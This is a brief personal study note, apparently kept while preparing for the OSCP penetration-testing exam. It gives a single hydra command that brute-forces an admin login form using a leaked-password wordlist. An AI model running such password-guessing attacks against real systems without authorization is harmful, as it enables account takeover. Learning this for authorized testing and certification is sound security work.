# hydra brute force HTTP post form
```bash
hydra $IP http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" \
-l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt -t 10 -w 30 -o hydra-http-post-attack.txt
```

` zet/20221003150666/README.md `

# Related

- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam

Tags:

    #command
